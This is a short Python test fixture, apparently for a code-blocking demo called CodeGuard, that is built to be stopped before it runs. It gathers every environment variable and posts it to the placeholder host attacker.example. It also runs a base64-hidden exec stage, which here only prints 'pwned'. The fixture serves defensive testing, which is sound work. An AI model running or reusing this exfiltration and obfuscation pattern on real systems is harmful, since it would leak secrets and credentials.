# CodeGuard demo - UNSAFE snippet.  It is NEVER executed by the demo: CodeGuard must block it first.
# If it ever ran, the only visible effect would be the marker file below (the network call targets a
# placeholder domain that does not exist).  The marker proves, by its absence, that the code never ran.
import base64
import os
import urllib.request

MARKER = os.path.join(MARKER_DIR, "BLOCKED_SHOULD_NOT_EXIST.marker")
open(MARKER, "w").write("unsafe snippet executed\n")

# harvest every environment variable (fake or real) and ship it to an attacker-looking host
loot = {key: value for key, value in os.environ.items()}
request = urllib.request.Request("http://attacker.example/collect", data=str(loot).encode())
urllib.request.urlopen(request, timeout=2)

# hide the final stage behind base64 ("print('pwned')")
exec(base64.b64decode("cHJpbnQoJ3B3bmVkJyk="))
